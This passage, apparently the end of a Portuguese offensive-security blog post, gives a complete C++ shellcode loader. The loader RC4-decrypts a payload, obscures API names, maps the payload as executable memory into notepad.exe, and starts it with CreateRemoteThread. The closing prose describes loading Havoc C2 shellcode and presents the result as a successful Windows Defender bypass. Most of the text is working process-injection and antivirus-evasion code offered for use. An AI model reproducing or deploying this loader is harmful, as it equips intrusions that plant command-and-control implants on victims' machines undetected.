+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;OneCore.lib&quot;</span>)</span>
+
+<span class="hljs-comment">// link: https://learn.microsoft.com/en-us/windows/console/console-screen-buffers#character-attributes</span>
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetConsoleColor</span><span class="hljs-params">(WORD color)</span> </span>{
+    HANDLE hConsole = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+    <span class="hljs-built_in">SetConsoleTextAttribute</span>(hConsole, color);
+}
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_CLIENT_ID</span> {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_UNICODE_STRING</span> {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_OBJECT_ATTRIBUTES</span> {
+    ULONG           Length;
+    HANDLE          RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG           Attributes;
+    PVOID           SecurityDescriptor;
+    PVOID           SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> InitializeObjectAttributes(p, n, a, r, s) { \
+    (p)-&gt;Length = sizeof(OBJECT_ATTRIBUTES);        \
+    (p)-&gt;RootDirectory = r;                         \
+    (p)-&gt;Attributes = a;                            \
+    (p)-&gt;ObjectName = n;                            \
+    (p)-&gt;SecurityDescriptor = s;                    \
+    (p)-&gt;SecurityQualityOfService = NULL;           \
+}</span>
+
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtOpenProcess_t)</span><span class="hljs-params">(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId)</span></span>;
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HANDLE</span><span class="hljs-params">(WINAPI* FuncaoThread)</span><span class="hljs-params">(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;
+
+FuncaoThread CriarThreadRemota;
+<span class="hljs-type">char</span> dllKernel[] = { <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-number">0</span> };
+<span class="hljs-type">char</span> nomeFuncaoThread[] = { <span class="hljs-string">&#x27;C&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;R&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-number">0</span> };
+
+<span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;
+T <span class="hljs-title">GetNtFunction</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName)</span> </span>{
+    HMODULE ntdll = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);
+    <span class="hljs-keyword">if</span> (!ntdll) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Falha ao obter identificador para ntdll.dll&quot;</span> &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast</span>&lt;T&gt;(<span class="hljs-built_in">GetProcAddress</span>(ntdll, funcName));
+}
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_USTRING</span> {
+	ULONG Length;
+	ULONG MaximumLength;
+	PWSTR Buffer;
+} USTRING;
+
+<span class="hljs-keyword">typedef</span> LONG NTSTATUS;
+
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* fnSystemFunction032)</span><span class="hljs-params">(
+	USTRING* Img,
+	USTRING* Key
+	)</span></span>;
+
+<span class="hljs-function">BOOL <span class="hljs-title">RC4DEC</span><span class="hljs-params">(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize)</span> </span>{
+	NTSTATUS STATUS;
+	USTRING Key = { dwRc4KeySize, dwRc4KeySize, <span class="hljs-built_in">reinterpret_cast</span>&lt;PWSTR&gt;(pRc4Key) };
+	USTRING Img = { sPayloadSize, sPayloadSize, <span class="hljs-built_in">reinterpret_cast</span>&lt;PWSTR&gt;(pPayloadData) };
+	<span class="hljs-type">char</span> a_dll_name[] = { <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;p&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-number">0</span> };
+	<span class="hljs-type">char</span> NotSysFunc32[] = { <span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;F&#x27;</span>,<span class="hljs-string">&#x27;u&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;t&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-number">0</span> };
+	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">LoadLibraryA</span>(a_dll_name), NotSysFunc32);
+
+	STATUS = <span class="hljs-built_in">SystemFunction032</span>(&amp;Img, &amp;Key);
+	<span class="hljs-keyword">if</span> (STATUS != <span class="hljs-number">0x0</span>) {
+		<span class="hljs-keyword">return</span> FALSE;
+	}
+	<span class="hljs-keyword">return</span> TRUE;
+}
+
+<span class="hljs-function">BOOL <span class="hljs-title">InjetarPayload</span><span class="hljs-params">(IN HANDLE handleProcesso, IN PBYTE payload, IN SIZE_T tamanhoPayload, OUT PVOID* enderecoRemoto)</span> </span>{
+    BOOL estado = TRUE;
+    HANDLE handleMapeamentoArquivo = <span class="hljs-literal">NULL</span>;
+    PVOID enderecoLocal = <span class="hljs-literal">NULL</span>, enderecoMapeamentoRemoto = <span class="hljs-literal">NULL</span>;
+
+    handleMapeamentoArquivo = <span class="hljs-built_in">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-literal">NULL</span>, (DWORD)tamanhoPayload, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">if</span> (handleMapeamentoArquivo == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao criar o mapeamento de arquivo.&quot;</span> &lt;&lt; std::endl;
+        estado = FALSE;
+        <span class="hljs-keyword">goto</span> FimDaFuncao;
+    }
+
+    enderecoLocal = <span class="hljs-built_in">MapViewOfFile</span>(handleMapeamentoArquivo, FILE_MAP_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, tamanhoPayload);
+    <span class="hljs-keyword">if</span> (enderecoLocal == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao mapear a visão do arquivo.&quot;</span> &lt;&lt; std::endl;
+        estado = FALSE;
+        <span class="hljs-keyword">goto</span> FimDaFuncao;
+    }
+
+    <span class="hljs-built_in">memcpy</span>(enderecoLocal, payload, tamanhoPayload);
+    enderecoMapeamentoRemoto = <span class="hljs-built_in">MapViewOfFile2</span>(handleMapeamentoArquivo, handleProcesso, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE);
+    <span class="hljs-keyword">if</span> (enderecoMapeamentoRemoto == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao mapear a visao do arquivo remoto.&quot;</span> &lt;&lt; std::endl;
+        estado = FALSE;
+        <span class="hljs-keyword">goto</span> FimDaFuncao;
+    }
+
+FimDaFuncao:
+    *enderecoRemoto = enderecoMapeamentoRemoto;
+    <span class="hljs-keyword">if</span> (handleMapeamentoArquivo)
+        <span class="hljs-built_in">CloseHandle</span>(handleMapeamentoArquivo);
+    <span class="hljs-keyword">return</span> estado;
+}
+
+<span class="hljs-function">BOOL <span class="hljs-title">ObterHandleProcesso</span><span class="hljs-params">(IN LPCWSTR nomeProcesso, OUT DWORD* idProcesso, OUT HANDLE* handleProcesso, NtOpenProcess_t NtOpenProcess)</span> </span>{
+    HANDLE handleSnapshot = <span class="hljs-literal">NULL</span>;
+    PROCESSENTRY32 entradaProcesso;
+    entradaProcesso.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);
+
+    handleSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">if</span> (handleSnapshot == INVALID_HANDLE_VALUE) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao criar snapshot do processo.&quot;</span> &lt;&lt; std::endl;
+        <span class="hljs-keyword">goto</span> FimDaFuncao;
+    }
+
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Process32First</span>(handleSnapshot, &amp;entradaProcesso)) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao obter o primeiro processo.&quot;</span> &lt;&lt; std::endl;
+        <span class="hljs-keyword">goto</span> FimDaFuncao;
+        <span class="hljs-keyword">return</span> FALSE;
+    }
+
+    <span class="hljs-keyword">do</span> {
+        WCHAR nomeMinusculo[MAX_PATH * <span class="hljs-number">2</span>];
+        DWORD tamanho = <span class="hljs-built_in">lstrlenW</span>(entradaProcesso.szExeFile);
+        DWORD i = <span class="hljs-number">0</span>;
+        <span class="hljs-built_in">RtlSecureZeroMemory</span>(nomeMinusculo, MAX_PATH * <span class="hljs-number">2</span>);
+
+        <span class="hljs-keyword">if</span> (tamanho &lt; MAX_PATH * <span class="hljs-number">2</span>) {
+            <span class="hljs-keyword">for</span> (; i &lt; tamanho; i++)
+                nomeMinusculo[i] = (WCHAR)<span class="hljs-built_in">tolower</span>(entradaProcesso.szExeFile[i]);
+            nomeMinusculo[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;
+        }
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">wcscmp</span>(nomeMinusculo, nomeProcesso) == <span class="hljs-number">0</span>) {
+            *idProcesso = entradaProcesso.th32ProcessID;
+
+            OBJECT_ATTRIBUTES objAttr;
+            CLIENT_ID clientId;
+            <span class="hljs-built_in">InitializeObjectAttributes</span>(&amp;objAttr, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
+            clientId.UniqueProcess = (HANDLE)(*idProcesso);
+            clientId.UniqueThread = <span class="hljs-number">0</span>;
+
+            NTSTATUS status = <span class="hljs-built_in">NtOpenProcess</span>(handleProcesso, PROCESS_ALL_ACCESS, &amp;objAttr, &amp;clientId);
+            <span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
+                <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+                std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Falha ao abrir o processo.&quot;</span> &lt;&lt; std::endl;
+                <span class="hljs-keyword">break</span>;
+            }
+        }
+    } <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(handleSnapshot, &amp;entradaProcesso));
+
+FimDaFuncao:
+    <span class="hljs-keyword">if</span> (handleSnapshot != <span class="hljs-literal">NULL</span>)
+        <span class="hljs-built_in">CloseHandle</span>(handleSnapshot);
+    <span class="hljs-keyword">if</span> (*idProcesso == <span class="hljs-literal">NULL</span> || *handleProcesso == <span class="hljs-literal">NULL</span>)
+        <span class="hljs-keyword">return</span> FALSE;
+    <span class="hljs-keyword">return</span> TRUE;
+}
+
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">wchar_t</span>* argv[])</span> </span>{
+    NtOpenProcess_t NtOpenProcess = <span class="hljs-built_in">GetNtFunction</span>&lt;NtOpenProcess_t&gt;(<span class="hljs-string">&quot;NtOpenProcess&quot;</span>);
+
+    <span class="hljs-keyword">if</span> (!NtOpenProcess) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Falha ao resolver uma ou mais funções da API nativa do NT.&quot;</span> &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    }
+
+    HANDLE processoAlvo = <span class="hljs-literal">NULL</span>, threadRemota = <span class="hljs-literal">NULL</span>;
+    PVOID enderecoRemoto = <span class="hljs-literal">NULL</span>;
+    DWORD idProcessoAlvo = <span class="hljs-number">0</span>;
+
+	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> payload[] = { <span class="hljs-number">0x00</span> };
+
+	<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> chaveRC4[] = { <span class="hljs-number">0x00</span> };
+
+	BOOL DECRYPT = <span class="hljs-built_in">RC4DEC</span>(chaveRC4, <span class="hljs-built_in">static_cast</span>&lt;PBYTE&gt;(payload), <span class="hljs-built_in">sizeof</span>(chaveRC4), <span class="hljs-built_in">sizeof</span>(payload));
+
+    <span class="hljs-keyword">if</span> (!DECRYPT) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Falha na decriptação do payload.&quot;</span> &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cout &lt;&lt; <span class="hljs-string">R&quot;(
+__________               .__         .____                     .___            
+\______   \_____    _____|__| ____   |    |    _________     __| _/___________ 
+ |    |  _/\__  \  /  ___/  |/ ___\  |    |   /  _ \__  \   / __ |/ __ \_  __ \
+ |    |   \ / __ \_\___ \|  \  \___  |    |__(  &lt;_&gt; ) __ \_/ /_/ \  ___/|  | \/
+ |______  /(____  /____  &gt;__|\___  &gt; |_______ \____(____  /\____ |\___  &gt;__|   
+        \/      \/     \/        \/          \/         \/      \/    \/       
+    )&quot;</span> <span class="hljs-string">&quot;\n\n&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+
+    std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Pressione Enter para localizar o processo alvo.&quot;</span> &lt;&lt; std::endl;
+    std::cin.<span class="hljs-built_in">get</span>();
+
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ObterHandleProcesso</span>(<span class="hljs-string">L&quot;notepad.exe&quot;</span>, &amp;idProcessoAlvo, &amp;processoAlvo, NtOpenProcess)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+
+    std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Processo encontrado: PID &quot;</span> &lt;&lt; idProcessoAlvo &lt;&lt; std::endl;
+    std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Endereco do payload: &quot;</span> &lt;&lt; <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">void</span>*&gt;(payload) &lt;&lt; std::endl;
+    std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Pressione Enter para injetar o payload.&quot;</span> &lt;&lt; std::endl;
+    std::cin.<span class="hljs-built_in">get</span>();
+
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">InjetarPayload</span>(processoAlvo, payload, <span class="hljs-built_in">sizeof</span>(payload), &amp;enderecoRemoto)) {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+
+    std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Endereco remoto apos injecao: &quot;</span> &lt;&lt; enderecoRemoto &lt;&lt; std::endl;
+
+    HMODULE moduloKernel = <span class="hljs-built_in">GetModuleHandleA</span>(dllKernel);
+    <span class="hljs-keyword">if</span> (moduloKernel == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao obter o handle para kernel32.dll&quot;</span> &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+
+    CriarThreadRemota = (FuncaoThread)<span class="hljs-built_in">GetProcAddress</span>(moduloKernel, nomeFuncaoThread);
+    <span class="hljs-keyword">if</span> (CriarThreadRemota == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao localizar a funcao CreateRemoteThread.&quot;</span> &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+
+    std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Pressione Enter para criar Thread remota.&quot;</span> &lt;&lt; std::endl;
+	std::cin.<span class="hljs-built_in">get</span>();
+
+    threadRemota = <span class="hljs-built_in">CriarThreadRemota</span>(processoAlvo, <span class="hljs-literal">NULL</span>, (SIZE_T)<span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)enderecoRemoto, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">if</span> (threadRemota == <span class="hljs-literal">NULL</span>)
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+
+    std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Thread remota criada com sucesso!&quot;</span> &lt;&lt; std::endl;
+
+    <span class="hljs-built_in">CloseHandle</span>(threadRemota);
+    <span class="hljs-built_in">CloseHandle</span>(processoAlvo);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</pre>
+                        <br>
+                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+                            Resaltando pontos importantes<br></h2>
+                        <p>Não estamos evitando a análise estática do código muito bem. Deveríamos melhorar isso, mas
+                            acho que vou mostrar como evitar melhor a análise estática do código em outro post focado
+                            apenas nesse tópico.<br>Mesmo assim, esse código, em um contexto de bypass <strong>Windows
+                                Defender</strong>, vai funcionar, mas observe que essa técnica não escapará de soluções
+                            de defesa mais sofisticadas, como <strong>EDRs</strong> ou alguns <strong>AVs</strong>.<br>
+                        </p>
+                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+                            VirusTotal</h2><br>
+                        <p><img src="https://i.imgur.com/ExN5zf3.png" alt="Resultado"
+                                style="max-width: 100%; height: auto; width: 600px; display: block; margin: 20px auto;">
+                        </p>
+                        <br>
+                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+                            Testando nosso código<br></h2>
+                        <p>Bom, após gerar a nossa shellcode do <span style="color: #9E2525;">havoc</span>, vamos
+                            ofuscar ela com o nosso código em Python. Depois, basta colocar no nosso código a shellcode
+                            ofuscada e a chave RC4 gerada:<br></p>
+                        <br>
+                        <div align="center">
+                            <iframe width="980" height="615" src="https://www.youtube.com/embed/lxxMhHpS_As"
+                                frameborder="0" allowfullscreen></iframe>
+                        </div>
+                        <br>
+                        <p>Como podem observar no vídeo, tenho uma exclusão no meu disco local D, mas isso não vai
+                            impedir do <strong>Windows Defender</strong> poder detectar nosso &quot;Malware&quot;. Notem
+                            também que mostro ao longo do vídeo que nossa payload é descriptografada e escrita na
+                            memória do processo alvo com sucesso. Também ao longo do vídeo, mostro que, após criar nossa
+                            thread remota, a ofuscação de sono começa a fazer efeito, mas mostro que tem sim como
+                            detectar a shellcode implantada, aguardando o término do sono e analisando no exato momento
+                            em que ele &quot;reinicia&quot; o sono. e obviamente, no final, conseguimos contornar o
+                            <strong>Windows Defender</strong> com sucesso.
+                        </p>
+                    </div>
+                </article>
+            </div>
+        </main>
+        <footer style="background-color: rgba(27, 27, 27, 0.7); text-align: center; padding: 5px 0;">
+            <h6 style="color: rgba(255, 255, 255, 0.4) !important;">Copyright © Vithor 2023/2024</h6>
+        </footer>
+        <script>
+            function isMobileDevice() {
+                return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
+            }
+
+            if (isMobileDevice()) {
+                alert("Este site não é compatível com dispositivos móveis. Você será redirecionado para o Google.");
+                window.location.href = "https://www.google.com";
+            }
+        </script>
+    </body>
+
+</html>
